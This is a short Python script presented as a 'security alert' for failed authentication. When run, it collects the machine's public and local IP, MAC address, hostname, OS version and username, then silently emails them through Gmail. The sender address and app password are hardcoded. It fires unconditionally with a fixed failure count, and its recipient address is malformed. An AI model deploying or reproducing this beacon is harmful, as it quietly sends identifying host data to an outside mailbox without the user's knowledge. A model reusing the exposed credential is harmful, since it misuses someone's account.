import socket
import platform
import getpass
import requests
import time
import smtplib
import psutil  # For fetching MAC address
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def get_mac_address():
    """Get the MAC address of the first active network interface."""
    mac_address = "N/A"
    for interface, addresses in psutil.net_if_addrs().items():
        for addr in addresses:
            if addr.family == psutil.AF_LINK:  # AF_LINK is the MAC address family
                mac_address = addr.address
                return mac_address  # Return the first found MAC address
    return mac_address

def get_system_info():
    """Collect high-sensitive system information for failed attempts."""
    info = {}

    # Get current timestamp
    info["timestamp"] = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())

    # Public IP Address using ipify (only IP, no location data)
    try:
        ip_info = requests.get('https://api.ipify.org?format=json').json()
        info["public_ip"] = ip_info.get('ip', 'N/A')
    except Exception as e:
        info["public_ip"] = "N/A"
        info["location_error"] = str(e)

    # Local IP Address
    info["local_ip"] = socket.gethostbyname(socket.gethostname())

    # Machine Information
    info["hostname"] = socket.gethostname()
    info["os"] = platform.system()
    info["os_version"] = platform.version()
    info["username"] = getpass.getuser()

    # MAC Address
    info["mac_address"] = get_mac_address()

    return info

def format_email_body(system_info, failed_attempts):
    """Create a detailed email body with sensitive information structured."""
    body = f"""
    Security Alert: {failed_attempts} Failed Authentication Attempts

    Time of Last Attempt: {system_info['timestamp']}
    
    IP Information:
    - Public IP Address: {system_info['public_ip']}
    - Local IP Address: {system_info['local_ip']}
    - MAC Address: {system_info['mac_address']}
    
    Machine Information:
    - Hostname: {system_info['hostname']}
    - Operating System: {system_info['os']} ({system_info['os_version']})
    - Username: {system_info['username']}
    
    ****JAMAL_DH****

    """
    return body

def send_email_alert(subject, body, to_email):
    """Sends an email alert with the given subject and body to the specified email."""
    from_email = "Jzororonoro@gmail.com"  
    password = "siip uwbu yuxv qppq "  # Use app-specific password using Gmail

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    try:
        # Connect to Gmail SMTP server
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()  # Secure the connection
        server.login(from_email, password)
        server.sendmail(from_email, to_email, msg.as_string())
        server.quit()
        #print("Warning email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")


system_info = get_system_info()
email_body = format_email_body(system_info, failed_attempts=5)  # Example with 5 failed attempts
send_email_alert("Security Alert: Authentication Failure", email_body, "Jzororonoro@gmail.com.com")
